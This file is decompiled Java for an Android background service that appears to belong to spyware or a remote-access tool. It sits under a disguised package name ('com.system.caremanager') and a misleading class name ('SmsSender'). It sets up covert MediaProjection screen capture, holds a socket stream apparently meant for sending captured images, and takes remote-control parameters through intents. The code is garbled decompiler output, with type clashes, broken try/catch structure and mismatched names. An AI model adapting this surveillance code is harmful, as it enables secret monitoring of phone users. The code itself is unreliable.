package com.system.caremanager;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

public class SmsSender extends Service {

    static final String ACTION_RECORD = "com.system.caremanager.app.RECORD";
    static final String ACTION_SHUTDOWN = "com.system.caremanager.app.SHUTDOWN";
    private static final String CHANNEL_WHATEVER = "Scaning";
    static final String EXTRA_RESULT_CODE = "resultCode";
    static final String EXTRA_RESULT_INTENT = "resultIntent";
    public static int FPS = "0x0";
    public static boolean ISON;
    public static boolean Lo;
    private static final int NOTIFY_ID = "0x26b2";
    public static String PID;
    public static int Q = "0x0";
    static final int VIRT_DISPLAY_FLAGS = "0x2";
    public static boolean ctd;
    public static String display_height;
    public static String display_width;
    public static OutputStream out;
    private static MediaProjection projection;
    public static Socket sk;
    public static Object syc;
    public static boolean usd;
    private static VirtualDisplay vdisplay;
    public List bts;
    private Handler handler;
    private final HandlerThread handlerThread;
    private MiscHelper2 it;
    private MediaProjectionManager mgr;
    private int resultCode;
    private Intent resultData;
    private WindowManager wmgr;

    static {
        // Static initialization block
    }

    public SmsSenderEngine() {
        HandlerThread handlerThread = new HandlerThread();
        Class result = this.getClass();
        String result2 = result.getSimpleName();
        int val = 10;
        this.handlerThread = handlerThread;
        ArrayList arrayList = new ArrayList();
        this.bts = arrayList;
        return;
    }

    public static void di() {
        try {
            SmsSenderEngine.Lo = null;
            Socket sk = SmsSenderEngine.sk;
            sk.shutdownOutput();
            } catch (Exception e) {
                e.printStackTrace();
            Socket sk2 = SmsSenderEngine.sk;
            sk2.shutdownInput();
            } catch (Exception e) {
                e.printStackTrace();
            Socket sk3 = SmsSenderEngine.sk;
            OutputStream result = sk3.getOutputStream();
            result.close();
            } catch (Exception e) {
                e.printStackTrace();
            Socket sk4 = SmsSenderEngine.sk;
            InputStream result2 = sk4.getInputStream();
            result.close();
            } catch (Exception e) {
                e.printStackTrace();
            Socket sk5 = SmsSenderEngine.sk;
            sk5.close();
            } catch (Exception e) {
                e.printStackTrace();
            OutputStream out = SmsSenderEngine.out;
            if (out == null) {
                // branch: cond_0
            }
            out.close();
            } catch (Exception e) {
                e.printStackTrace();
            SmsSenderEngine.out = null;
            return;
        } catch (IOException e) {
            e.printStackTrace();
        } catch (SocketException e) {
            e.printStackTrace();
        }
    }

    private void foregroundify() {
        Intent intent = new Intent();
        Class cls = SmsSenderEngine.class;
        String str = "com.system.caremanager.app.RECORD";
        Intent result = intent.setAction(str);
        ComponentName result2 = this.startService(result);
        return;
    }

    private void startCapture() {
        MediaProjectionManager mgr = this.mgr;
        int resultCode = this.resultCode;
        Intent resultData = this.resultData;
        MediaProjection result = mgr.getMediaProjection(resultCode, resultData);
        SmsSenderEngine.projection = result;
        MiscHelper2 miscHelper2 = new MiscHelper2();
        this.it = miscHelper2;
        SmsSenderEngine.4 smsSenderEngine.4 = new SmsSenderEngine.4();
        MediaProjection projection = SmsSenderEngine.projection;
        String str = "andshooter";
        MiscHelper2 it = this.it;
        int result2 = it.getWidth();
        MiscHelper2 it2 = this.it;
        int result3 = it2.getHeight();
        Resources result4 = this.getResources();
        DisplayMetrics result5 = result.getDisplayMetrics();
        int densityDpi = result.densityDpi;
        int val = 2;
        MiscHelper2 it3 = this.it;
        Surface result6 = it3.getSurface();
        Handler handler = this.handler;
        VirtualDisplay result7 = v1 .. v9.createVirtualDisplay();
        SmsSenderEngine.vdisplay = result;
        MediaProjection projection2 = SmsSenderEngine.projection;
        Handler handler2 = this.handler;
        projection2.registerCallback(smsSenderEngine.4, handler2);
        return;
    }

    public static void stopCapture() {
        MediaProjection projection = SmsSenderEngine.projection;
        if (projection == null) {
            // branch: cond_0
        }
        projection.stop();
        VirtualDisplay vdisplay = SmsSenderEngine.vdisplay;
        vdisplay.release();
        SmsSenderEngine.projection = null;
        return;
    }

    public void FindNewIcon() {
        Thread thread = new Thread();
        SmsSenderEngine.2 smsSenderEngine.2 = new SmsSenderEngine.2();
        thread.start();
        return;
    }

    Handler getHandler() {
        Handler handler = this.handler;
        return handler;
    }

    WindowManager getWindowManager() {
        WindowManager wmgr = this.wmgr;
        return wmgr;
    }

    public IBinder onBind(Intent param1) {
        IllegalStateException illegalStateException = new IllegalStateException();
        String str = "Binding not supported.";
        throw new RuntimeException(illegalStateException.toString());
        return null;
    }

    public void onCreate() {
        this.onCreate();
        String str = "media_projection";
        Object result = this.getSystemService(str);
        result = (MediaProjectionManager) result;
        this.mgr = result;
        String str2 = "window";
        Object result2 = this.getSystemService(str2);
        result = (WindowManager) result;
        this.wmgr = result;
        HandlerThread handlerThread = this.handlerThread;
        handlerThread.start();
        Handler handler = new Handler();
        HandlerThread handlerThread2 = this.handlerThread;
        Looper result3 = handlerThread2.getLooper();
        this.handler = handler;
        return;
    }

    public void onDestroy() {
        SmsSenderEngine.stopCapture();
        this.onDestroy();
        return;
    }

    public int onStartCommand(Intent param1, int param2, int param3) {
        Context result = this.getApplicationContext();
        String str = "SCH";
        String str2 = "720";
        String result2 = My_Settings.read(result, str, str2);
        SmsSenderEngine.display_width = result;
        Context result3 = this.getApplicationContext();
        String str3 = "SCW";
        String str4 = "1080";
        String result4 = My_Settings.read(result, str3, str4);
        SmsSenderEngine.display_height = result;
        String result5 = param1.getAction();
        if (result != null) {
            // branch: cond_0
        }
        String str5 = "resultCode";
        int val = 1337;
        int result6 = param1.getIntExtra(str5, val);
        this.resultCode = result;
        String str6 = "resultIntent";
        Parcelable result7 = param1.getParcelableExtra(str6);
        result = (Intent) result;
        this.resultData = result;
        String str7 = "Q";
        int val2 = 10;
        int result8 = param1.getIntExtra(str7, val2);
        SmsSenderEngine.Q = result;
        String str8 = "F";
        int val3 = 5;
        int result9 = param1.getIntExtra(str8, val3);
        SmsSenderEngine.FPS = result;
        String str9 = "P";
        String result10 = param1.getStringExtra(str9);
        SmsSenderEngine.PID = result;
        this.foregroundify();
        // continue loop -> :goto_0
        String str10 = "com.system.caremanager.app.RECORD";
        String result11 = result.getAction();
        boolean result12 = str10.equals(result);
        if (result == null) {
            // branch: cond_2
        }
        Intent resultData = this.resultData;
        if (resultData == null) {
            // branch: cond_1
        }
        this.FindNewIcon();
        // continue loop -> :goto_0
        Intent intent = new Intent();
        Class cls = MainLauncherActivity.class;
        int val4 = 268435456;
        Intent result13 = intent.addFlags(val4);
        this.startActivity(result);
        // continue loop -> :goto_0
        String str11 = "com.system.caremanager.app.SHUTDOWN";
        String result14 = result.getAction();
        boolean result15 = str11.equals(result);
        if (result == null) {
            // branch: cond_3
        }
        SmsSenderEngine.ISON = null;
        SmsSenderEngine.stopCapture();
        this.stopForeground(1);
        this.stopSelf();
        int val5 = 2;
        return val5;
    }

    public void pr() {
        Thread thread = new Thread();
        SmsSenderEngine.1 smsSenderEngine.1 = new SmsSenderEngine.1();
        thread.start();
        return;
    }

    void processImage(byte[] param1) {
        SmsSenderEngine.3 smsSenderEngine.3 = new SmsSenderEngine.3();
        smsSenderEngine.3.start();
        return;
    }

}